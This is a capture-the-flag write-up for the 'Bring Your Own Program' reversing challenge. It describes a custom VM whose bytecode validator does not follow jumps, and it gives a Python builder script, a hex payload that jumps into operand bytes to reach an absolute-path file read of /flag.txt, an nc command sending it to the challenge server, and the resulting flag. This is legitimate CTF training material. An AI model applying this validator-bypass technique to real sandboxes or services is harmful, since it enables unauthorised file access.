# Bring Your Own Program (rev)

## Goal
Craft a program for the custom VM that reads `/flag.txt` on the remote service and returns the real flag.

Key output:
- Dockerfile copies real flag to `/flag.txt` inside the container.

## VM format (from `chal.js`)
Input is a hex string parsed into bytes.

Header + constants + code:
- `nr` (1 byte): number of registers (1..64)
- `nc` (1 byte): number of constants
- Each constant:
  - `type` (1 byte)
  - If `type == 1`: float64 (8 bytes)
  - If `type == 2`: string length (u16 LE) + bytes
- Remaining bytes are `code`

Notable opcodes (byte values):
- `0x01` (a): `rX = const[Y]`
- `0x02` (b): `rX = caps[const[Y]]` (string name lookup)
- `0x20` (c): `rX = obj[key]`
- `0x21` (d): resolve capability function by key
- `0x30` (e): call function
- `0x31` (f): return
- `0x60` (h): relative jump (signed 16-bit)

Capabilities:
- Key `0` -> `F0` : read **absolute** file path
- Key `0x0a` -> `F1` : read under `/data/public` only

## Bug / bypass
Validation (`U(...)`) walks the bytecode linearly and checks opcodes and operands, but it **does not** follow jumps.
This allows jumping into the middle of a valid instruction so that its *operand bytes* are executed as opcodes (which were never validated).

We use a valid `op e` instruction as a “carrier” and jump into its operands to execute a hidden opcode sequence that uses key `0` (absolute file read), which is otherwise rejected by validation.

## Exploit program
Constants:
- `"caps"`
- `"/flag.txt"`

High-level execution:
1) Load `caps` into a register, then access index `3` to get the `caps` table.
2) Jump into the operands of a carrier `op e`.
3) Execute hidden opcodes:
   - `op d` -> fetch capability key `0` (absolute read)
   - `op a` -> load `/flag.txt`
   - `op e` -> call read function
   - `op f` -> return the file contents

## Builder script
```python
from binascii import hexlify

def build():
    consts = [b"caps", b"/flag.txt"]
    const_bytes = bytearray()
    for s in consts:
        const_bytes.append(2)
        const_bytes += len(s).to_bytes(2,'little')
        const_bytes += s

    code = bytearray()
    code += bytes([0x02, 0x00, 0x00])                # op b: r0 = caps
    code += bytes([0x20, 0x01, 0x00, 0x03])          # op c: r1 = r0[3]
    code += bytes([0x60, 0x05, 0x00])                # op h: jump +5 into payload

    # carrier1 op e (argc=8); payload starts at arg0
    code += bytes([0x30, 0x00, 0x00, 0x00, 0x08,
                   0x21, 0x00, 0x01, 0x01, 0x00, 0x01, 0x02, 0x01])

    # carrier2 / payload: op e (argc=1)
    code += bytes([0x30, 0x03, 0x00, 0x01, 0x01, 0x02])

    # payload end: op f
    code += bytes([0x31, 0x03])

    data = bytearray([64, len(consts)]) + const_bytes + code
    return data

b = build()
print(hexlify(b).decode())
```

Generated hex program:
```
4002020400636170730209002f666c61672e74787402000020010003600500300000000821000101000102013003000101023103
```

## Run (how to)
```bash
printf '%s\n' "4002020400636170730209002f666c61672e74787402000020010003600500300000000821000101000102013003000101023103" | nc 35.245.96.82 5000
```

## Result
```
uoftctf{c4ch3_m3_1n11n3_h0w_80u7_d4h??}
```
